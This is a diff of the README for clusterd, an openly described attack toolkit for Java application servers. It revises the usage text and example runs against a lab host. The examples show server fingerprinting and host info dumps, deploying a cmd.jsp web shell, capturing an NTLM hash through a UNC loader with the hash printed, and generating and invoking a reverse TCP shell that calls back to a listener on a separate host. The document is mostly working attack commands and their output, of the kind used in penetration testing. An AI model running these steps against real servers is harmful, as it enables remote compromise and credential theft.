@@ -80,8 +80,8 @@ examples / usage
 ```
 $ ./clusterd.py 
 
-        clusterd/0.2 - clustered attack toolkit
-            [Supporting 5 platforms]
+        clusterd/0.3 - clustered attack toolkit
+            [Supporting 6 platforms]
 
 usage: ./clusterd.py [options]
 
@@ -105,7 +105,7 @@ Connection:
 Remote Host:
   Settings specific to the remote host
 
-  -a [jboss|coldfusion|weblogic|tomcat|railo]
+  -a [jboss|coldfusion|weblogic|tomcat|railo|axis2]
                         Hint at remote host service
   -o [windows|linux]    Hint at remote host OS
   -v [version]          Specific version to test
@@ -122,6 +122,7 @@ Deploy:
   --deployer [deployer]
                         Specify a deployer to use
   --invoke              Invoke payload after deployment
+  --rand-payload        Use a random name for the deployed file
   -b [user]             Brute force credentials for user [admin]
   --wordlist [path]     Wordlist for brute forcing passwords
 
@@ -148,10 +149,14 @@ railo modules:
   --rl-info             Dump host information
   --rl-smb              Obtain SMB hash
 
+axis2 modules:
+  --ax-info             Dump host information
+  --ax-list             List deployed services
+
 Other:
   Miscellaneous flags
 
-  --deploy-list         List all available deployers
+  --deployer-list       List all available deployers
   --aux-list            List all available exploits
   --gen-payload [host:port] for reverse connection
                         Generate a reverse shell payload
@@ -165,155 +170,155 @@ Other:
 
 jboss fingerprint and host info
 ```
-bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a jboss --jb-info --random-agent
+$ ./clusterd.py -i 192.168.1.105 -a jboss --jb-info --random-agent
 
-        clusterd/0.1 - clustered attack toolkit
-          Supporting jboss, coldfusion, weblogic, tomcat
+        clusterd/0.3 - clustered attack toolkit
+            [Supporting 6 platforms]
 
- [2014-01-25 06:51PM] Started at 2014-01-25 06:51PM
- [2014-01-25 06:51PM] Servers' OS hinted at windows
- [2014-01-25 06:51PM] Fingerprinting host '192.168.1.102'
- [2014-01-25 06:51PM] Server hinted at 'jboss'
- [2014-01-25 06:51PM] Checking jboss version 3.2 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 3.2 JBoss Web Console...
- [2014-01-25 06:51PM] Checking jboss version 3.0 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 4.2 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 4.2 JBoss Web Console...
- [2014-01-25 06:51PM] Checking jboss version 4.0 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 4.0 JBoss Web Console...
- [2014-01-25 06:51PM] Checking jboss version 5.1 JBoss Web Manager...
- [2014-01-25 06:51PM] Checking jboss version 5.1 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 5.1 JBoss Web Console...
- [2014-01-25 06:51PM] Checking jboss version 5.0 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 5.0 JBoss Web Console...
- [2014-01-25 06:51PM] Checking jboss version 6.0 JBoss Web Manager...
- [2014-01-25 06:51PM] Checking jboss version 6.1 JBoss Web Manager...
- [2014-01-25 06:51PM] Checking jboss version 6.1 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 6.0 JBoss JMX Console...
- [2014-01-25 06:51PM] Checking jboss version 7.1 JBoss Management...
- [2014-01-25 06:51PM] Checking jboss version 7.0 JBoss Management...
- [2014-01-25 06:51PM] Checking jboss version Any JBoss JMX Invoker Servlet...
- [2014-01-25 06:51PM] Checking jboss version Any JBoss RMI Interface...
- [2014-01-25 06:51PM] Checking jboss version Any JBoss Status Page...
- [2014-01-25 06:51PM] Matched 5 fingerprints for service jboss
- [2014-01-25 06:51PM]   JBoss JMX Console (version 5.0)
- [2014-01-25 06:51PM]   JBoss Web Console (version 5.0)
- [2014-01-25 06:51PM]   JBoss JMX Invoker Servlet (version Any)
- [2014-01-25 06:51PM]   JBoss RMI Interface (version Any)
- [2014-01-25 06:51PM]   JBoss Status Page (version Any)
- [2014-01-25 06:51PM] Fingerprinting completed.
- [2014-01-25 06:51PM] Attempting to retrieve JBoss info...
- [2014-01-25 06:51PM]   ActiveThreadCount: 71    
- [2014-01-25 06:51PM]   OSArch: amd64    
- [2014-01-25 06:51PM]   AvailableProcessors: 1    
- [2014-01-25 06:51PM]   MaxMemory: 518979584    
- [2014-01-25 06:51PM]   HostAddress: 192.168.1.102    
- [2014-01-25 06:51PM]   JavaVersion: 1.7.0_45    
- [2014-01-25 06:51PM]   OSVersion: 6.1    
- [2014-01-25 06:51PM]   TotalMemory: 282968064    
- [2014-01-25 06:51PM]   JavaVendor: Oracle Corporation    
- [2014-01-25 06:51PM]   ActiveThreadGroupCount: 9    
- [2014-01-25 06:51PM]   FreeMemory: 152545376    
- [2014-01-25 06:51PM]   OSName: Windows 7    
- [2014-01-25 06:51PM]   HostName: bryan-PC    
- [2014-01-25 06:51PM]   JavaVMVersion: 24.45-b08    
- [2014-01-25 06:51PM]   JavaVMVendor: Oracle Corporation    
- [2014-01-25 06:51PM]   JavaVMName: Java HotSpot(TM) 64-Bit Server VM    
- [2014-01-25 06:51PM] Finished at 2014-01-25 06:51PM
+ [2014-05-25 10:57PM] Started at 2014-05-25 10:57PM
+ [2014-05-25 10:57PM] Servers' OS hinted at windows
+ [2014-05-25 10:57PM] Fingerprinting host '192.168.1.105'
+ [2014-05-25 10:57PM] Server hinted at 'jboss'
+ [2014-05-25 10:57PM] Checking jboss version 3.2 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 3.2 JBoss Web Console...
+ [2014-05-25 10:57PM] Checking jboss version 3.0 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 4.2 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 4.2 JBoss Web Console...
+ [2014-05-25 10:57PM] Checking jboss version 4.0 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 4.0 JBoss Web Console...
+ [2014-05-25 10:57PM] Checking jboss version 5.1 JBoss Web Manager...
+ [2014-05-25 10:57PM] Checking jboss version 5.1 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 5.1 JBoss Web Console...
+ [2014-05-25 10:57PM] Checking jboss version 5.0 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 5.0 JBoss Web Console...
+ [2014-05-25 10:57PM] Checking jboss version 6.0 JBoss Web Manager...
+ [2014-05-25 10:57PM] Checking jboss version 6.1 JBoss Web Manager...
+ [2014-05-25 10:57PM] Checking jboss version 6.1 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 6.0 JBoss JMX Console...
+ [2014-05-25 10:57PM] Checking jboss version 7.1 JBoss Management...
+ [2014-05-25 10:57PM] Checking jboss version 7.0 JBoss Management...
+ [2014-05-25 10:57PM] Checking jboss version 8.0 JBoss Management...
+ [2014-05-25 10:57PM] Checking jboss version Any JBoss EJB Invoker Servlet...
+ [2014-05-25 10:57PM] Checking jboss version Any JBoss HTTP Headers (Unreliable)...
+ [2014-05-25 10:57PM] Checking jboss version Any JBoss JMX Invoker Servlet...
+ [2014-05-25 10:57PM] Checking jboss version Any JBoss RMI Interface...
+ [2014-05-25 10:57PM] Checking jboss version Any JBoss Status Page...
+ [2014-05-25 10:57PM] Matched 7 fingerprints for service jboss
+ [2014-05-25 10:57PM]   JBoss JMX Console (version 5.0)
+ [2014-05-25 10:57PM]   JBoss Web Console (version 5.0)
+ [2014-05-25 10:57PM]   JBoss EJB Invoker Servlet (version Any)
+ [2014-05-25 10:57PM]   JBoss HTTP Headers (Unreliable) (version 5.0)
+ [2014-05-25 10:57PM]   JBoss JMX Invoker Servlet (version Any)
+ [2014-05-25 10:57PM]   JBoss RMI Interface (version Any)
+ [2014-05-25 10:57PM]   JBoss Status Page (version Any)
+ [2014-05-25 10:57PM] Fingerprinting completed.
+ [2014-05-25 10:57PM] Attempting to retrieve JBoss info...
+ [2014-05-25 10:57PM]   ActiveThreadCount: 68    
+ [2014-05-25 10:57PM]   AvailableProcessors: 1    
+ [2014-05-25 10:57PM]   OSArch: amd64    
+ [2014-05-25 10:57PM]   MaxMemory: 518979584    
+ [2014-05-25 10:57PM]   HostAddress: 192.168.1.105    
+ [2014-05-25 10:57PM]   JavaVersion: 1.7.0_45    
+ [2014-05-25 10:57PM]   OSVersion: 6.1    
+ [2014-05-25 10:57PM]   TotalMemory: 286703616    
+ [2014-05-25 10:57PM]   JavaVendor: Oracle Corporation    
+ [2014-05-25 10:57PM]   ActiveThreadGroupCount: 9    
+ [2014-05-25 10:57PM]   OSName: Windows 7    
+ [2014-05-25 10:57PM]   FreeMemory: 122651808    
+ [2014-05-25 10:57PM]   HostName: bryan-PC    
+ [2014-05-25 10:57PM]   JavaVMVersion: 24.45-b08    
+ [2014-05-25 10:57PM]   JavaVMVendor: Oracle Corporation    
+ [2014-05-25 10:57PM]   JavaVMName: Java HotSpot(TM) 64-Bit Server VM    
+ [2014-05-25 10:57PM] Finished at 2014-05-25 10:57PM
 ```
 
 jboss DFS deployment against JBoss 5.0
 ```
-bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a jboss -v 5 --deploy ./src/lib/cmd.war --random-agent
+$ ./clusterd.py -i 192.168.1.105 -a jboss -v5.0 --deploy ./src/lib/resources/cmd.war --random-agent
 
-        clusterd/0.1 - clustered attack toolkit
-          Supporting jboss, coldfusion, weblogic, tomcat
+        clusterd/0.3 - clustered attack toolkit
+            [Supporting 6 platforms]
 
- [2014-01-25 06:54PM] Started at 2014-01-25 06:54PM
- [2014-01-25 06:54PM] Servers' OS hinted at windows
- [2014-01-25 06:54PM] Fingerprinting host '192.168.1.102'
- [2014-01-25 06:54PM] Server hinted at 'jboss'
- [2014-01-25 06:54PM] Checking jboss version 5.1 JBoss Web Manager...
- [2014-01-25 06:54PM] Checking jboss version 5.1 JBoss JMX Console...
- [2014-01-25 06:54PM] Checking jboss version 5.1 JBoss Web Console...
- [2014-01-25 06:54PM] Checking jboss version 5.0 JBoss JMX Console...
- [2014-01-25 06:54PM] Checking jboss version 5.0 JBoss Web Console...
- [2014-01-25 06:54PM] Checking jboss version Any JBoss JMX Invoker Servlet...
- [2014-01-25 06:54PM] Checking jboss version Any JBoss RMI Interface...
- [2014-01-25 06:54PM] Checking jboss version Any JBoss Status Page...
- [2014-01-25 06:54PM] Matched 5 fingerprints for service jboss
- [2014-01-25 06:54PM]   JBoss JMX Console (version 5.0)
- [2014-01-25 06:54PM]   JBoss Web Console (version 5.0)
- [2014-01-25 06:54PM]   JBoss JMX Invoker Servlet (version Any)
- [2014-01-25 06:54PM]   JBoss RMI Interface (version Any)
- [2014-01-25 06:54PM]   JBoss Status Page (version Any)
- [2014-01-25 06:54PM] Fingerprinting completed.
- [2014-01-25 06:54PM] This deployer requires a JSP, default to cmd.jsp? [Y/n] > 
- [2014-01-25 06:55PM] Preparing to deploy /home/bryan/tools/clusterd/src/lib/cmd.jsp...
- [2014-01-25 06:55PM] Successfully deployed /home/bryan/tools/clusterd/src/lib/cmd.jsp
- [2014-01-25 06:55PM] Finished at 2014-01-25 06:55PM
+ [2014-05-25 11:00PM] Started at 2014-05-25 11:00PM
+ [2014-05-25 11:00PM] Servers' OS hinted at windows
+ [2014-05-25 11:00PM] Fingerprinting host '192.168.1.105'
+ [2014-05-25 11:00PM] Server hinted at 'jboss'
+ [2014-05-25 11:00PM] Checking jboss version 5.0 JBoss JMX Console...
+ [2014-05-25 11:00PM] Checking jboss version 5.0 JBoss Web Console...
+ [2014-05-25 11:00PM] Checking jboss version Any JBoss EJB Invoker Servlet...
+ [2014-05-25 11:00PM] Checking jboss version Any JBoss HTTP Headers (Unreliable)...
+ [2014-05-25 11:00PM] Checking jboss version Any JBoss JMX Invoker Servlet...
+ [2014-05-25 11:00PM] Checking jboss version Any JBoss RMI Interface...
+ [2014-05-25 11:00PM] Checking jboss version Any JBoss Status Page...
+ [2014-05-25 11:00PM] Matched 7 fingerprints for service jboss
+ [2014-05-25 11:00PM]   JBoss JMX Console (version 5.0)
+ [2014-05-25 11:00PM]   JBoss Web Console (version 5.0)
+ [2014-05-25 11:00PM]   JBoss EJB Invoker Servlet (version Any)
+ [2014-05-25 11:00PM]   JBoss HTTP Headers (Unreliable) (version 5.0)
+ [2014-05-25 11:00PM]   JBoss JMX Invoker Servlet (version Any)
+ [2014-05-25 11:00PM]   JBoss RMI Interface (version Any)
+ [2014-05-25 11:00PM]   JBoss Status Page (version Any)
+ [2014-05-25 11:00PM] Fingerprinting completed.
+ [2014-05-25 11:00PM] This deployer requires a JSP, default to cmd.jsp? [Y/n] > 
+ [2014-05-25 11:00PM] Preparing to deploy cmd...
+ [2014-05-25 11:00PM] Successfully deployed '/cmd/cmd.jsp'
+ [2014-05-25 11:00PM] Finished at 2014-05-25 11:00PM
 ```
 
 jboss UNC hash retrieval
 ```
-bryan@debdev:~/tools/clusterd$ sudo ./clusterd.py -i 192.168.1.102 -a jboss -v4.2 --random-agent --jb-smb
+$ sudo ./clusterd.py -i 192.168.1.105 -a jboss -v4.2 --random-agent --jb-smb
 
-        clusterd/0.1 - clustered attack toolkit
-          Supporting jboss, coldfusion, weblogic, tomcat
+        clusterd/0.3 - clustered attack toolkit
+            [Supporting 6 platforms]
 
- [2014-02-08 12:24AM] Started at 2014-02-08 12:24AM
- [2014-02-08 12:24AM] Servers' OS hinted at windows
- [2014-02-08 12:24AM] Fingerprinting host '192.168.1.102'
- [2014-02-08 12:24AM] Server hinted at 'jboss'
- [2014-02-08 12:24AM] Checking jboss version 4.2 JBoss JMX Console...
- [2014-02-08 12:24AM] Checking jboss version 4.2 JBoss Web Console...
- [2014-02-08 12:24AM] Checking jboss version Any JBoss JMX Invoker Servlet...
- [2014-02-08 12:24AM] Checking jboss version Any JBoss RMI Interface...
- [2014-02-08 12:24AM] Checking jboss version Any JBoss Status Page...
- [2014-02-08 12:24AM] Matched 5 fingerprints for service jboss
- [2014-02-08 12:24AM]   JBoss JMX Console (version 4.2)
- [2014-02-08 12:24AM]   JBoss Web Console (version 4.2)
- [2014-02-08 12:24AM]   JBoss JMX Invoker Servlet (version Any)
- [2014-02-08 12:24AM]   JBoss RMI Interface (version Any)
- [2014-02-08 12:24AM]   JBoss Status Page (version Any)
- [2014-02-08 12:24AM] Fingerprinting completed.
- [2014-02-08 12:24AM] Setting up SMB listener..
- [2014-02-08 12:24AM] Invoking UNC loader...
- [2014-02-08 12:24AM] bryan::bryan-PC:1122334455667788:d24a1c43f9d219aa8a38d018ec7e9b89:01010000000000005a4d8bca9e24cf01ad86b744515b143100000000020000000000000000000000
- [2014-02-08 12:24AM] Finished at 2014-02-08 12:24AM
+ [2014-05-25 11:01PM] Started at 2014-05-25 11:01PM
+ [2014-05-25 11:01PM] Servers' OS hinted at windows
+ [2014-05-25 11:01PM] Fingerprinting host '192.168.1.105'
+ [2014-05-25 11:01PM] Server hinted at 'jboss'
+ [2014-05-25 11:01PM] Checking jboss version 4.2 JBoss JMX Console...
+ [2014-05-25 11:01PM] Checking jboss version 4.2 JBoss Web Console...
+ [2014-05-25 11:01PM] Checking jboss version Any JBoss EJB Invoker Servlet...
+ [2014-05-25 11:01PM] Checking jboss version Any JBoss HTTP Headers (Unreliable)...
+ [2014-05-25 11:01PM] Checking jboss version Any JBoss JMX Invoker Servlet...
+ [2014-05-25 11:01PM] Checking jboss version Any JBoss RMI Interface...
+ [2014-05-25 11:01PM] Checking jboss version Any JBoss Status Page...
+ [2014-05-25 11:01PM] Matched 7 fingerprints for service jboss
+ [2014-05-25 11:01PM]   JBoss JMX Console (version 4.2)
+ [2014-05-25 11:01PM]   JBoss Web Console (version 4.2)
+ [2014-05-25 11:01PM]   JBoss EJB Invoker Servlet (version Any)
+ [2014-05-25 11:01PM]   JBoss HTTP Headers (Unreliable) (version 4.2)
+ [2014-05-25 11:01PM]   JBoss JMX Invoker Servlet (version Any)
+ [2014-05-25 11:01PM]   JBoss RMI Interface (version Any)
+ [2014-05-25 11:01PM]   JBoss Status Page (version Any)
+ [2014-05-25 11:01PM] Fingerprinting completed.
+ [2014-05-25 11:01PM] Setting up SMB listener..
+ [2014-05-25 11:01PM] Invoking UNC loader...
+ [2014-05-25 11:01PM] bryan::bryan-PC:1122334455667788:34826253d353ebca4811bd08be0db067:01010000000000003dac35999f78cf019df7c49c7268a5f600000000020000000000000000000000
+ [2014-05-25 11:01PM] Finished at 2014-05-25 11:01PM
 ```
 
 tomcat deployment and reverse shell invocation
 ```
-bryan@debdev:~/tools/clusterd$ ./clusterd.py -i 192.168.1.102 -a tomcat --deploy shell.war --invoke
+$ ./clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
 
-        clusterd/0.1 - clustered attack toolkit
-          Supporting jboss, coldfusion, weblogic, tomcat
+        clusterd/0.3 - clustered attack toolkit
+            [Supporting 6 platforms]
 
- [2014-02-08 12:50AM] Started at 2014-02-08 12:50AM
- [2014-02-08 12:50AM] Servers' OS hinted at windows
- [2014-02-08 12:50AM] Fingerprinting host '192.168.1.102'
- [2014-02-08 12:50AM] Server hinted at 'tomcat'
- [2014-02-08 12:50AM] Checking tomcat version 3.3 Tomcat...
- [2014-02-08 12:50AM] Checking tomcat version 3.3 Tomcat Admin...
- [2014-02-08 12:50AM] Checking tomcat version 4.0 Tomcat...
- [2014-02-08 12:50AM] Checking tomcat version 4.1 Tomcat...
- [2014-02-08 12:50AM] Checking tomcat version 4.1 Tomcat Manager...
- [2014-02-08 12:50AM] Checking tomcat version 4.0 Tomcat Manager...
- [2014-02-08 12:50AM] Checking tomcat version 5.5 Tomcat...
- [2014-02-08 12:50AM] Checking tomcat version 5.5 Tomcat Manager...
- [2014-02-08 12:50AM] Checking tomcat version 6.0 Tomcat...
- [2014-02-08 12:50AM] Checking tomcat version 6.0 Tomcat Manager...
- [2014-02-08 12:50AM] Checking tomcat version 7.0 Tomcat...
- [2014-02-08 12:50AM] Checking tomcat version 7.0 Tomcat Manager...
- [2014-02-08 12:50AM] Checking tomcat version 8.0 Tomcat...
- [2014-02-08 12:50AM] Checking tomcat version 8.0 Tomcat Manager...
- [2014-02-08 12:50AM] Matched 2 fingerprints for service tomcat
- [2014-02-08 12:50AM]   Tomcat (version 5.5)
- [2014-02-08 12:50AM]   Tomcat Manager (version 5.5)
- [2014-02-08 12:50AM] Fingerprinting completed.
- [2014-02-08 12:50AM] Preparing to deploy shell.war...
- [2014-02-08 12:50AM] Deployed shell.war to /shell
- [2014-02-08 12:50AM] shell.war invoked at 192.168.1.102
- [2014-02-08 12:50AM] Finished at 2014-02-08 12:50AM
+ [2014-05-25 10:53PM] Started at 2014-05-25 10:53PM
+ [2014-05-25 10:53PM] Generating payload....
+ [2014-05-25 10:53PM] Payload generated (shell.war).  Payload: java/jsp_shell_reverse_tcp
+ [2014-05-25 10:53PM] Servers' OS hinted at windows
+ [2014-05-25 10:53PM] Fingerprinting host '192.168.1.105'
+ [2014-05-25 10:53PM] Server hinted at 'tomcat'
+ [2014-05-25 10:53PM] Checking tomcat version 5.5 Tomcat...
+ [2014-05-25 10:53PM] Checking tomcat version 5.5 Tomcat Manager...
+ [2014-05-25 10:53PM] Matched 2 fingerprints for service tomcat
+ [2014-05-25 10:53PM]   Tomcat (version 5.5)
+ [2014-05-25 10:53PM]   Tomcat Manager (version 5.5)
+ [2014-05-25 10:53PM] Fingerprinting completed.
+ [2014-05-25 10:53PM] Preparing to deploy /tmp/.clusterd/z1dgi.war...
+ [2014-05-25 10:53PM] Deployed /tmp/.clusterd/z1dgi.war to /z1dgi
+ [2014-05-25 10:53PM] z1dgi invoked at 192.168.1.105
+ [2014-05-25 10:53PM] Finished at 2014-05-25 10:53PM
 ```
